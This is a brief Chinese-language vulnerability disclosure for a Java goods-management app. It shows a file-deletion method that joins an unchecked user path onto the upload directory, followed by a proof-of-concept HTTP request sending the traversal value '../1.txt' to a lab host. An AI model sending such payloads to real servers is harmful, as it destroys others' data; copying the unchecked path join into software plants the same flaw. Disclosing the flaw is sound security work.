# 任意文件删除

漏洞代码

com.yeqifu.sys.common.AppFileUtils

`File file = new File(UPLOAD_PATH, oldPath);`直接拼接路径

```java
public static void removeFileByPath(String oldPath) {
        //图片的路径不是默认图片的路径
        if (!oldPath.equals(Constast.DEFAULT_IMG_GOODS)) {
            File file = new File(UPLOAD_PATH, oldPath);
            if (file.exists()) {
                file.delete();
            }
        }
    }
```

POC

```
POST /goods/deleteGoods HTTP/1.1
Host: 192.168.239.1:8888
Content-Length: 23
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.239.1:8888
Referer: http://192.168.239.1:8888/bus/toGoodsManager
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_c37f4573e086c82c1c0cc22e1b9d38a1=1766368890,1766736241; X-Access-Token=133608dd-84c4-462d-baab-92094220a56b; Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1766712702,1766735653,1767086014,1767161256; JSESSIONID=D14EE022DF12DEFB07D1866BC61D3356
Connection: keep-alive

id=18&goodsimg=../1.txt
```

